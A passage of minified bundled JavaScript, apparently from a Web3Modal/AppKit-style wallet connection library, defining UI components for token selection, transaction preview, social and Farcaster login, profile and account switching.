    border-radius: var(--wui-border-radius-xxs);
  }
`;var R4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let vg=class extends he{constructor(){super(),this.unsubscribe=[],this.tokenBalances=Dr.state.tokenBalances,this.search="",this.onDebouncedSearch=ke.debounce(e=>{this.search=e}),this.unsubscribe.push(Dr.subscribe(e=>{this.tokenBalances=e.tokenBalances}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex flexDirection="column">
        ${this.templateSearchInput()} <wui-separator></wui-separator> ${this.templateTokens()}
      </wui-flex>
    `}templateSearchInput(){return F`
      <wui-flex gap="xs" padding="s">
        <wui-input-text
          @inputChange=${this.onInputChange.bind(this)}
          class="network-search-input"
          size="sm"
          placeholder="Search token"
          icon="search"
        ></wui-input-text>
      </wui-flex>
    `}templateTokens(){return this.tokens=this.tokenBalances?.filter(e=>e.chainId===re.state.activeCaipNetwork?.caipNetworkId),this.search?this.filteredTokens=this.tokenBalances?.filter(e=>e.name.toLowerCase().includes(this.search.toLowerCase())):this.filteredTokens=this.tokens,F`
      <wui-flex
        class="contentContainer"
        flexDirection="column"
        .padding=${["0","s","0","s"]}
      >
        <wui-flex justifyContent="flex-start" .padding=${["m","s","s","s"]}>
          <wui-text variant="paragraph-500" color="fg-200">Your tokens</wui-text>
        </wui-flex>
        <wui-flex flexDirection="column" gap="xs">
          ${this.filteredTokens&&this.filteredTokens.length>0?this.filteredTokens.map(e=>F`<wui-list-token
                    @click=${this.handleTokenClick.bind(this,e)}
                    ?clickable=${!0}
                    tokenName=${e.name}
                    tokenImageUrl=${e.iconUrl}
                    tokenAmount=${e.quantity.numeric}
                    tokenValue=${e.value}
                    tokenCurrency=${e.symbol}
                  ></wui-list-token>`):F`<wui-flex
                .padding=${["4xl","0","0","0"]}
                alignItems="center"
                flexDirection="column"
                gap="l"
              >
                <wui-icon-box
                  icon="coinPlaceholder"
                  size="inherit"
                  iconColor="fg-200"
                  backgroundColor="fg-200"
                  iconSize="lg"
                ></wui-icon-box>
                <wui-flex
                  class="textContent"
                  gap="xs"
                  flexDirection="column"
                  justifyContent="center"
                  flexDirection="column"
                >
                  <wui-text variant="paragraph-500" align="center" color="fg-100"
                    >No tokens found</wui-text
                  >
                  <wui-text variant="small-400" align="center" color="fg-200"
                    >Your tokens will appear here</wui-text
                  >
                </wui-flex>
                <wui-link @click=${this.onBuyClick.bind(this)}>Buy</wui-link>
              </wui-flex>`}
        </wui-flex>
      </wui-flex>
    `}onBuyClick(){Ee.push("OnRampProviders")}onInputChange(e){this.onDebouncedSearch(e.detail)}handleTokenClick(e){Dr.setToken(e),Dr.setTokenAmount(void 0),Ee.goBack()}};vg.styles=ABe;R4([te()],vg.prototype,"tokenBalances",void 0);R4([te()],vg.prototype,"tokens",void 0);R4([te()],vg.prototype,"filteredTokens",void 0);R4([te()],vg.prototype,"search",void 0);vg=R4([me("w3m-wallet-send-select-token-view")],vg);const IBe=ge`
  wui-avatar,
  wui-image {
    display: ruby;
    width: 32px;
    height: 32px;
    border-radius: var(--wui-border-radius-3xl);
  }

  .sendButton {
    width: 70%;
    --local-width: 100% !important;
    --local-border-radius: var(--wui-border-radius-xs) !important;
  }

  .cancelButton {
    width: 30%;
    --local-width: 100% !important;
    --local-border-radius: var(--wui-border-radius-xs) !important;
  }
`;var Rp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let zd=class extends he{constructor(){super(),this.unsubscribe=[],this.token=Dr.state.token,this.sendTokenAmount=Dr.state.sendTokenAmount,this.receiverAddress=Dr.state.receiverAddress,this.receiverProfileName=Dr.state.receiverProfileName,this.receiverProfileImageUrl=Dr.state.receiverProfileImageUrl,this.gasPriceInUSD=Dr.state.gasPriceInUSD,this.caipNetwork=re.state.activeCaipNetwork,this.unsubscribe.push(Dr.subscribe(e=>{this.token=e.token,this.sendTokenAmount=e.sendTokenAmount,this.receiverAddress=e.receiverAddress,this.gasPriceInUSD=e.gasPriceInUSD,this.receiverProfileName=e.receiverProfileName,this.receiverProfileImageUrl=e.receiverProfileImageUrl}),re.subscribeKey("activeCaipNetwork",e=>this.caipNetwork=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F` <wui-flex flexDirection="column" .padding=${["0","l","l","l"]}>
      <wui-flex gap="xs" flexDirection="column" .padding=${["0","xs","0","xs"]}>
        <wui-flex alignItems="center" justifyContent="space-between">
          <wui-flex flexDirection="column" gap="4xs">
            <wui-text variant="small-400" color="fg-150">Send</wui-text>
            ${this.sendValueTemplate()}
          </wui-flex>
          <wui-preview-item
            text="${this.sendTokenAmount?Wt.roundNumber(this.sendTokenAmount,6,5):"unknown"} ${this.token?.symbol}"
            .imageSrc=${this.token?.iconUrl}
          ></wui-preview-item>
        </wui-flex>
        <wui-flex>
          <wui-icon color="fg-200" size="md" name="arrowBottom"></wui-icon>
        </wui-flex>
        <wui-flex alignItems="center" justifyContent="space-between">
          <wui-text variant="small-400" color="fg-150">To</wui-text>
          <wui-preview-item
            text="${this.receiverProfileName?Wt.getTruncateString({string:this.receiverProfileName,charsStart:20,charsEnd:0,truncate:"end"}):Wt.getTruncateString({string:this.receiverAddress?this.receiverAddress:"",charsStart:4,charsEnd:4,truncate:"middle"})}"
            address=${this.receiverAddress??""}
            .imageSrc=${this.receiverProfileImageUrl??void 0}
            .isAddress=${!0}
          ></wui-preview-item>
        </wui-flex>
      </wui-flex>
      <wui-flex flexDirection="column" .padding=${["xxl","0","0","0"]}>
        <w3m-wallet-send-details
          .caipNetwork=${this.caipNetwork}
          .receiverAddress=${this.receiverAddress}
          .networkFee=${this.gasPriceInUSD}
        ></w3m-wallet-send-details>
        <wui-flex justifyContent="center" gap="xxs" .padding=${["s","0","0","0"]}>
          <wui-icon size="sm" color="fg-200" name="warningCircle"></wui-icon>
          <wui-text variant="small-400" color="fg-200">Review transaction carefully</wui-text>
        </wui-flex>
        <wui-flex justifyContent="center" gap="s" .padding=${["l","0","0","0"]}>
          <wui-button
            class="cancelButton"
            @click=${this.onCancelClick.bind(this)}
            size="lg"
            variant="neutral"
          >
            Cancel
          </wui-button>
          <wui-button
            class="sendButton"
            @click=${this.onSendClick.bind(this)}
            size="lg"
            variant="main"
          >
            Send
          </wui-button>
        </wui-flex>
      </wui-flex></wui-flex
    >`}sendValueTemplate(){if(this.token&&this.sendTokenAmount){const t=this.token.price*this.sendTokenAmount;return F`<wui-text variant="paragraph-400" color="fg-100"
        >$${t.toFixed(2)}</wui-text
      >`}return null}onSendClick(){Dr.sendToken()}onCancelClick(){Ee.goBack()}};zd.styles=IBe;Rp([te()],zd.prototype,"token",void 0);Rp([te()],zd.prototype,"sendTokenAmount",void 0);Rp([te()],zd.prototype,"receiverAddress",void 0);Rp([te()],zd.prototype,"receiverProfileName",void 0);Rp([te()],zd.prototype,"receiverProfileImageUrl",void 0);Rp([te()],zd.prototype,"gasPriceInUSD",void 0);Rp([te()],zd.prototype,"caipNetwork",void 0);zd=Rp([me("w3m-wallet-send-preview-view")],zd);const TBe=ge`
  wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }
  wui-flex::-webkit-scrollbar {
    display: none;
  }
  wui-flex.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }
`;var Zee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let N7=class extends he{constructor(){super(...arguments),this.checked=!1}render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox,s=!!(e||t)&&!!i,o=s&&!this.checked,a=o?-1:void 0;return F`
      <w3m-legal-checkbox @checkboxChange=${this.onCheckboxChange.bind(this)}></w3m-legal-checkbox>
      <wui-flex
        flexDirection="column"
        .padding=${s?["0","s","s","s"]:"s"}
        gap="xs"
        class=${ye(o?"disabled":void 0)}
      >
        <w3m-wallet-login-list tabIdx=${ye(a)}></w3m-wallet-login-list>
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}onCheckboxChange(e){this.checked=!!e.detail}};N7.styles=TBe;Zee([te()],N7.prototype,"checked",void 0);N7=Zee([me("w3m-connect-wallets-view")],N7);const kBe=ge`
  wui-flex {
    max-height: clamp(360px, 540px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }
  wui-flex::-webkit-scrollbar {
    display: none;
  }
  wui-flex.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }
`;var Yee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let P7=class extends he{constructor(){super(...arguments),this.checked=!1}render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox,s=!!(e||t)&&!!i,o=s&&!this.checked,a=o?-1:void 0;return F`
      <w3m-legal-checkbox @checkboxChange=${this.onCheckboxChange.bind(this)}></w3m-legal-checkbox>
      <wui-flex
        flexDirection="column"
        .padding=${s?["0","s","s","s"]:"s"}
        gap="xs"
        class=${ye(o?"disabled":void 0)}
      >
        <w3m-social-login-list tabIdx=${ye(a)}></w3m-social-login-list>
      </wui-flex>
      <w3m-legal-footer></w3m-legal-footer>
    `}onCheckboxChange(e){this.checked=!!e.detail}};P7.styles=kBe;Yee([te()],P7.prototype,"checked",void 0);P7=Yee([me("w3m-connect-socials-view")],P7);const NBe=ge`
  wui-logo {
    width: 80px;
    height: 80px;
    border-radius: var(--wui-border-radius-m);
  }
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }
  wui-flex:first-child:not(:only-child) {
    position: relative;
  }
  wui-loading-thumbnail {
    position: absolute;
  }
  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }
  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }
  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }
  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }
  .capitalize {
    text-transform: capitalize;
  }
`;var $3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let mp=class extends he{constructor(){super(),this.unsubscribe=[],this.socialProvider=Se.state.socialProvider,this.socialWindow=Se.state.socialWindow,this.error=!1,this.connecting=!1,this.message="Connect in the provider window",this.authConnector=Xe.getAuthConnector(),this.handleSocialConnection=async e=>{if(e.data?.resultUri)if(e.origin===wd.SECURE_SITE_ORIGIN){window.removeEventListener("message",this.handleSocialConnection,!1);try{if(this.authConnector&&!this.connecting){this.socialWindow&&(this.socialWindow.close(),Se.setSocialWindow(void 0,re.state.activeChain)),this.connecting=!0,this.updateMessage();const t=e.data.resultUri;this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_REQUEST_USER_DATA",properties:{provider:this.socialProvider}}),await this.authConnector.provider.connectSocial(t),this.socialProvider&&(He.setConnectedSocialProvider(this.socialProvider),await ft.connectExternal(this.authConnector,this.authConnector.chain),Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:this.socialProvider}}))}}catch{this.error=!0,this.updateMessage(),this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:this.socialProvider}})}}else Ee.goBack(),vt.showError("Untrusted Origin"),this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:this.socialProvider}})},this.unsubscribe.push(Se.subscribe(e=>{e.socialProvider&&(this.socialProvider=e.socialProvider),e.socialWindow&&(this.socialWindow=e.socialWindow),e.address&&(Ut.state.open||Ne.state.enableEmbedded)&&Ut.close()})),this.authConnector&&this.connectSocial()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),window.removeEventListener("message",this.handleSocialConnection,!1),this.socialWindow?.close(),Se.setSocialWindow(void 0,re.state.activeChain)}render(){return F`
      <wui-flex
        data-error=${ye(this.error)}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-logo logo=${ye(this.socialProvider)}></wui-logo>
          ${this.error?null:this.loaderTemplate()}
          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>
        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100"
            >Log in with
            <span class="capitalize">${this.socialProvider??"Social"}</span></wui-text
          >
          <wui-text align="center" variant="small-400" color=${this.error?"error-100":"fg-200"}
            >${this.message}</wui-text
          ></wui-flex
        >
      </wui-flex>
    `}loaderTemplate(){const e=Mi.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return F`<wui-loading-thumbnail radius=${t*9}></wui-loading-thumbnail>`}connectSocial(){const e=setInterval(()=>{this.socialWindow?.closed&&(!this.connecting&&Ee.state.view==="ConnectingSocial"&&(this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_CANCELED",properties:{provider:this.socialProvider}}),Ee.goBack()),clearInterval(e))},1e3);window.addEventListener("message",this.handleSocialConnection,!1)}updateMessage(){this.error?this.message="Something went wrong":this.connecting?this.message="Retrieving user data":this.message="Connect in the provider window"}};mp.styles=NBe;$3([te()],mp.prototype,"socialProvider",void 0);$3([te()],mp.prototype,"socialWindow",void 0);$3([te()],mp.prototype,"error",void 0);$3([te()],mp.prototype,"connecting",void 0);$3([te()],mp.prototype,"message",void 0);mp=$3([me("w3m-connecting-social-view")],mp);const PBe=ge`
  wui-flex {
    width: 100%;
  }

  wui-icon-link {
    margin-right: calc(var(--wui-icon-box-size-md) * -1);
  }

  .account-links {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .account-links wui-flex {
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex: 1;
    background: red;
    align-items: center;
    justify-content: center;
    height: 48px;
    padding: 10px;
    flex: 1 0 0;

    border-radius: var(--XS, 16px);
    border: 1px solid var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    background: var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  .account-links wui-flex:hover {
    background: var(--dark-accent-glass-015, rgba(71, 161, 255, 0.15));
  }

  .account-links wui-flex wui-icon {
    width: var(--S, 20px);
    height: var(--S, 20px);
  }

  .account-links wui-flex wui-icon svg path {
    stroke: #47a1ff;
  }

  .account-settings-button {
    padding: calc(var(--wui-spacing-m) - 1px) var(--wui-spacing-2l);
    height: 40px;
    border-radius: var(--wui-border-radius-xxs);
    border: 1px solid var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    cursor: pointer;
  }

  .account-settings-button:hover {
    background: var(--wui-color-gray-glass-005);
  }
`;var R3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wp=class extends he{constructor(){super(),this.usubscribe=[],this.address=Se.state.address,this.profileImage=Se.state.profileImage,this.profileName=Se.state.profileName,this.accounts=Se.state.allAccounts,this.loading=!1,this.usubscribe.push(Se.subscribeKey("address",e=>{e?this.address=e:Ut.close()})),this.usubscribe.push(Se.subscribeKey("profileImage",e=>{this.profileImage=e})),this.usubscribe.push(Se.subscribeKey("profileName",e=>{this.profileName=e}))}disconnectedCallback(){this.usubscribe.forEach(e=>e())}render(){if(!this.address)throw new Error("w3m-profile-view: No account provided");return F`
      <wui-flex flexDirection="column" gap="l" .padding=${["0","xl","m","xl"]}>
        <wui-flex flexDirection="column" alignItems="center" gap="l">
          <wui-avatar
            alt=${this.address}
            address=${this.address}
            imageSrc=${ye(this.profileImage)}
            size="2lg"
          ></wui-avatar>
          <wui-flex flexDirection="column" alignItems="center">
            <wui-flex gap="3xs" alignItems="center" justifyContent="center">
              <wui-text variant="title-6-600" color="fg-100" data-testid="account-settings-address">
                ${this.profileName?Wt.getTruncateString({string:this.profileName,charsStart:20,charsEnd:0,truncate:"end"}):Wt.getTruncateString({string:this.address,charsStart:4,charsEnd:6,truncate:"middle"})}
              </wui-text>
              <wui-icon-link
                size="md"
                icon="copy"
                iconColor="fg-200"
                @click=${this.onCopyAddress}
              ></wui-icon-link>
            </wui-flex>
          </wui-flex>
        </wui-flex>
        <wui-flex
          data-testid="account-settings-button"
          justifyContent="center"
          alignItems="center"
          class="account-settings-button"
          @click=${()=>Ee.push("AccountSettings")}
        >
          <wui-text variant="paragraph-500" color="fg-100">Account Settings</wui-text>
        </wui-flex>
        ${this.accountsTemplate()}
      </wui-flex>
    `}accountsTemplate(){return F`<wui-flex flexDirection="column">
      <wui-flex .padding=${["3xs","m","s","s"]}>
        <wui-text color="fg-200" variant="paragraph-400">Your accounts</wui-text>
      </wui-flex>
      <wui-flex flexDirection="column" gap="xxs">
        ${this.accounts.map(e=>this.accountTemplate(e))}
      </wui-flex>
    </wui-flex>`}async onSwitchAccount(e){if(this.loading=!0,Xe.getAuthConnector()){const i=e.type;await ft.setPreferredAccountType(i)}Se.setShouldUpdateToAddress(e.address,re.state.activeChain),this.loading=!1}accountTemplate(e){return F`<wui-list-account accountAddress=${e.address} accountType=${e.type}>
      ${e.address===this.address?"":F`<wui-button
            slot="action"
            textVariant="small-600"
            size="md"
            variant="accent"
            @click=${()=>this.onSwitchAccount(e)}
            .loading=${this.loading}
            >Switch</wui-button
          >`}
    </wui-list-account>`}onCopyAddress(){try{this.address&&(ke.copyToClopboard(this.address),vt.showSuccess("Address copied"))}catch{vt.showError("Failed to copy")}}};wp.styles=PBe;R3([te()],wp.prototype,"address",void 0);R3([te()],wp.prototype,"profileImage",void 0);R3([te()],wp.prototype,"profileName",void 0);R3([te()],wp.prototype,"accounts",void 0);R3([te()],wp.prototype,"loading",void 0);wp=R3([me("w3m-profile-view")],wp);const $Be=ge`
  wui-avatar {
    width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
    box-shadow: 0 0 0 0;
  }

  wui-icon-box {
    position: relative;
    right: 15px;
    top: 15px;
    border: 2px solid var(--wui-color-bg-150);
    background-color: var(--wui-color-bg-125);
  }
`;var XR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let hy=class extends he{constructor(){super(),this.metadata=Ne.state.metadata,this.allAccounts=Se.state.allAccounts||[],this.balances={},this.labels=Se.state.addressLabels,this.currentAddress=Se.state.address||"",this.caipNetwork=re.state.activeCaipNetwork,Se.subscribeKey("allAccounts",e=>{this.allAccounts=e})}connectedCallback(){super.connectedCallback(),this.allAccounts.forEach(e=>{Lt.getBalance(e.address,this.caipNetwork?.caipNetworkId).then(t=>{let i=this.balances[e.address]||0;t.balances.length>0&&(i=t.balances.reduce((n,s)=>n+(s?.value||0),0)),this.balances[e.address]=i,this.requestUpdate()})})}getAddressIcon(e){return e==="smartAccount"?"lightbulb":"mail"}render(){return F`
      <wui-flex justifyContent="center" .padding=${["xl","0","xl","0"]}>
        <wui-banner-img
          imageSrc=${ye(this.metadata?.icons[0])}
          text=${ye(this.metadata?.url)}
          size="sm"
        ></wui-banner-img>
      </wui-flex>
      <wui-flex flexDirection="column" gap="xxl" .padding=${["l","xl","xl","xl"]}>
        ${this.allAccounts.map((e,t)=>this.getAddressTemplate(e,t))}
      </wui-flex>
    `}getAddressTemplate(e,t){const i=this.labels?.get(e.address),n=re.state.activeChain,o=He.getConnectedConnectorId(n)===Me.CONNECTOR_ID.AUTH;return F`
      <wui-flex
        flexDirection="row"
        justifyContent="space-between"
        data-testid="switch-address-item"
      >
        <wui-flex alignItems="center">
          <wui-avatar address=${e.address}></wui-avatar>
          ${o?F`<wui-icon-box
                size="sm"
                iconcolor="fg-200"
                backgroundcolor="glass-002"
                background="gray"
                icon="${this.getAddressIcon(e.type)}"
                ?border=${!0}
              ></wui-icon-box>`:F`<wui-flex .padding="${["0","0","0","s"]}"></wui-flex>`}
          <wui-flex flexDirection="column">
            <wui-text class="address" variant="paragraph-500" color="fg-100"
              >${i||Wt.getTruncateString({string:e.address,charsStart:4,charsEnd:6,truncate:"middle"})}</wui-text
            >
            <wui-text class="address-description" variant="small-400">
              ${typeof this.balances[e.address]=="number"?`$${this.balances[e.address]?.toFixed(2)}`:F`<wui-loading-spinner size="sm" color="accent-100"></wui-loading-spinner>`}
            </wui-text>
          </wui-flex>
        </wui-flex>
        <wui-flex gap="s" alignItems="center">
          ${e.address?.toLowerCase()===this.currentAddress?.toLowerCase()?"":F`
                <wui-button
                  data-testid=${`w3m-switch-address-button-${t}`}
                  textVariant="small-600"
                  size="md"
                  variant="accent"
                  @click=${()=>this.onSwitchAddress(e.address)}
                  >Switch to</wui-button
                >
              `}
        </wui-flex>
      </wui-flex>
    `}onSwitchAddress(e){const t=re.state.activeCaipNetwork,i=t?.chainNamespace,n=`${i}:${t?.id}:${e}`;Se.setCaipAddress(n,i),Ut.close()}};hy.styles=$Be;XR([te()],hy.prototype,"allAccounts",void 0);XR([te()],hy.prototype,"balances",void 0);hy=XR([me("w3m-switch-address-view")],hy);const RBe=ge`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }

  wui-logo {
    width: 80px;
    height: 80px;
    border-radius: var(--wui-border-radius-m);
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }
  wui-loading-thumbnail {
    position: absolute;
  }
  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }
`;var O4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let yg=class extends he{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.socialProvider=Se.state.socialProvider,this.uri=Se.state.farcasterUrl,this.ready=!1,this.loading=!1,this.authConnector=Xe.getAuthConnector(),this.forceUpdate=()=>{this.requestUpdate()},this.unsubscribe.push(Se.subscribeKey("farcasterUrl",e=>{e&&(this.uri=e,this.connectFarcaster())}),Se.subscribeKey("socialProvider",e=>{e&&(this.socialProvider=e)})),window.addEventListener("resize",this.forceUpdate)}disconnectedCallback(){super.disconnectedCallback(),clearTimeout(this.timeout),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),F`${this.platformTemplate()}`}platformTemplate(){return ke.isMobile()?F`${this.mobileTemplate()}`:F`${this.desktopTemplate()}`}desktopTemplate(){return this.loading?F`${this.loadingTemplate()}`:F`${this.qrTemplate()}`}qrTemplate(){return F` <wui-flex
      flexDirection="column"
      alignItems="center"
      .padding=${["0","xl","xl","xl"]}
      gap="xl"
    >
      <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

      <wui-text variant="paragraph-500" color="fg-100">
        Scan this QR Code with your phone
      </wui-text>
      ${this.copyTemplate()}
    </wui-flex>`}loadingTemplate(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-logo logo="farcaster"></wui-logo>
          ${this.loaderTemplate()}
          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>
        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100">
            Loading user data
          </wui-text>
          <wui-text align="center" variant="small-400" color="fg-200">
            Please wait a moment while we load your data.
          </wui-text>
        </wui-flex>
      </wui-flex>
    `}mobileTemplate(){return F` <wui-flex
      flexDirection="column"
      alignItems="center"
      .padding=${["3xl","xl","xl","xl"]}
      gap="xl"
    >
      <wui-flex justifyContent="center" alignItems="center">
        <wui-logo logo="farcaster"></wui-logo>
        ${this.loaderTemplate()}
        <wui-icon-box
          backgroundColor="error-100"
          background="opaque"
          iconColor="error-100"
          icon="close"
          size="sm"
          border
          borderColor="wui-color-bg-125"
        ></wui-icon-box>
      </wui-flex>
      <wui-flex flexDirection="column" alignItems="center" gap="xs">
        <wui-text align="center" variant="paragraph-500" color="fg-100"
          >Continue in Farcaster</span></wui-text
        >
        <wui-text align="center" variant="small-400" color="fg-200"
          >Accept connection request in the app</wui-text
        ></wui-flex
      >
      ${this.mobileLinkTemplate()}
    </wui-flex>`}loaderTemplate(){const e=Mi.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return F`<wui-loading-thumbnail radius=${t*9}></wui-loading-thumbnail>`}async connectFarcaster(){if(this.authConnector)try{await this.authConnector?.provider.connectFarcaster(),this.socialProvider&&(He.setConnectedSocialProvider(this.socialProvider),Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_REQUEST_USER_DATA",properties:{provider:this.socialProvider}})),this.loading=!0,await ft.connectExternal(this.authConnector,this.authConnector.chain),this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:this.socialProvider}}),this.loading=!1,Ut.close()}catch(e){this.socialProvider&&Ve.sendEvent({type:"track",event:"SOCIAL_LOGIN_ERROR",properties:{provider:this.socialProvider}}),Ee.goBack(),vt.showError(e)}}mobileLinkTemplate(){return F`<wui-button
      size="md"
      ?loading=${this.loading}
      ?disabled=${!this.uri||this.loading}
      @click=${()=>{this.uri&&ke.openHref(this.uri,"_blank")}}
    >
      Open farcaster</wui-button
    >`}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout(()=>{this.ready=!0},200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.getBoundingClientRect().width-40;return F` <wui-qr-code
      size=${e}
      theme=${Mi.state.themeMode}
      uri=${this.uri}
      ?farcaster=${!0}
      data-testid="wui-qr-code"
      color=${ye(Mi.state.themeVariables["--w3m-qr-color"])}
    ></wui-qr-code>`}copyTemplate(){const e=!this.uri||!this.ready;return F`<wui-link
      .disabled=${e}
      @click=${this.onCopyUri}
      color="fg-200"
      data-testid="copy-wc2-uri"
    >
      <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
      Copy link
